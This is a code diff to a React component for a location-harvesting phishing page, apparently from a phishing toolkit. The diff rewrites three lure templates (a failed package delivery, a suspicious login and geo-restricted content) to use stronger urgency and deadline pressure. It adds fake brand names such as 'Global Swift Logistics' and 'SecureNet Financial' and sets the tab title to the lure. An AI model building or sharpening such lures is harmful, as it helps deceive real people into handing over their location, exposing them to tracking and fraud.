@@ -8,7 +8,7 @@ import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { Card as ShadcnCard, CardContent, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card';
-import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck } from 'lucide-react';
+import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck, Globe } from 'lucide-react';
 
 interface TemplateContent {
   title: string;
@@ -20,30 +20,30 @@ interface TemplateContent {
 
 const templateContent: Record<string, TemplateContent> = {
   'package-delivery-issue': {
-    title: 'Action Required: Package Delivery Issue',
-    actionText: 'Verify Delivery Address & Reschedule',
-    message: "We're having trouble delivering your package. Please verify your current location to help us resolve the issue and reschedule your delivery.",
-    pageSpecificMessage: "Our system indicates a recent delivery attempt for package #TZ78391B was unsuccessful. To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
+    title: "URGENT: Delivery Failure - Action Required for Package #TZ78391B",
+    message: "CRITICAL ALERT: We were unable to deliver your package #TZ78391B. Immediate location verification is needed to reschedule or redirect your shipment and avoid return fees.",
+    pageSpecificMessage: "Your package #TZ78391B is on hold due to a delivery address discrepancy. Verify your current location NOW to confirm your address or select an urgent pickup point. Failure to act within 24 hours may result in package return.",
+    actionText: "VERIFY LOCATION & PREVENT RETURN",
     heroIcon: Truck,
   },
   'security-alert': {
-    title: 'Urgent: Account Security Action Required',
-    actionText: 'Verify Location & Secure Account',
-    message: "SECURITY ALERT: Unusual Account Activity Detected",
-    pageSpecificMessage: "We have identified suspicious activity associated with your account. To ensure your account's safety and prevent unauthorized access, please verify your current location immediately. This is a critical security measure. Your prompt attention is appreciated.",
+    title: "IMMEDIATE ACTION REQUIRED: Unusual Login Attempt Detected",
+    message: "URGENT SECURITY ALERT: We've detected a suspicious login attempt on your account from an unrecognized location. Verify your current location immediately to secure your account.",
+    pageSpecificMessage: "Your account safety is our priority. An unusual login was flagged. Confirm your location now to prevent potential unauthorized access. This is a time-sensitive security measure.",
+    actionText: "SECURE ACCOUNT & VERIFY LOCATION NOW",
     heroIcon: ShieldAlert,
   },
   'content-unlock': {
-    title: 'Unlock Exclusive Local Content',
-    actionText: 'Verify Location to Access',
-    message: 'this content is blocked in some areas.',
-    pageSpecificMessage: "Access videos, images, novels, and other files that are restricted in certain countries. Share your location to confirm you reside in a region where this content is available and not blocked.",
+    title: "Exclusive Content Unlocked: Verify Region",
+    message: "You've gained access to premium local content! Just verify your location to unlock videos, articles, and downloads restricted in other regions.",
+    pageSpecificMessage: "Congratulations! Access exclusive content (videos, files, articles) available only in your current region. A quick location check is required to unlock these special features.",
+    actionText: "Access Geo-Restricted Content",
     heroIcon: Lock,
   },
   default: {
-    title: 'Location Verification Needed',
-    actionText: 'Verify My Location',
-    message: 'Please share your location to continue using this service.',
+    title: "Location Verification Required for Service Access",
+    message: "To continue using this premium service and for compliance with regional settings, please share your location.",
+    actionText: "Verify Location to Continue",
     heroIcon: MapPin,
   }
 };
@@ -75,6 +75,12 @@ export default function LocationPhishingPage() {
     addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [templateId]);
+
+  useEffect(() => {
+    if (content.title) {
+      document.title = content.title;
+    }
+  }, [content.title]);
 
   useEffect(() => {
     if (status === 'captured') {
@@ -148,6 +154,10 @@ export default function LocationPhishingPage() {
       case 'package-delivery-issue': {
         return (
           <div className="space-y-6 text-center">
+            <div className="mb-6">
+              <h2 className="text-2xl font-bold text-gray-700 dark:text-gray-300">Global Swift Logistics</h2>
+              <p className="text-sm text-muted-foreground">Your Trusted Delivery Partner</p>
+            </div>
             <HeroIcon className="w-20 h-20 text-primary mx-auto mb-4" />
             <p className="text-xl text-muted-foreground leading-relaxed">
               {content.message}
@@ -182,11 +192,14 @@ export default function LocationPhishingPage() {
         const CurrentHeroIcon = content.heroIcon || ShieldAlert;
         return (
           <Alert variant="destructive" className="mb-6 text-left p-6 shadow-xl border-2 border-destructive-foreground/30">
-            <div className="flex items-center mb-4">
-              <CurrentHeroIcon className="h-12 w-12 mr-4 text-destructive flex-shrink-0" />
-              <AlertTitle className="text-3xl font-bold text-destructive">
-                {content.message}
-              </AlertTitle>
+            <div className="flex items-start mb-4"> {/* Changed to items-start for better alignment with subtitle */}
+              <CurrentHeroIcon className="h-12 w-12 mr-4 text-destructive flex-shrink-0 mt-1" />
+              <div>
+                <h3 className="text-sm font-semibold text-destructive/80 -mb-1">SecureNet Financial</h3>
+                <AlertTitle className="text-3xl font-bold text-destructive">
+                  {content.message}
+                </AlertTitle>
+              </div>
             </div>
             <AlertDescription className="space-y-4">
               <p className="text-md leading-relaxed text-destructive/90">
@@ -214,6 +227,10 @@ export default function LocationPhishingPage() {
               <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
               <ShadcnCardTitle className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardTitle>
               <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
+              <div className="pt-3 flex items-center justify-center text-sm text-muted-foreground/80">
+                <Globe className="h-4 w-4 mr-1.5" />
+                Powered by GeoUnlock&trade;
+              </div>
             </CardContent>
           </ShadcnCard>
         );
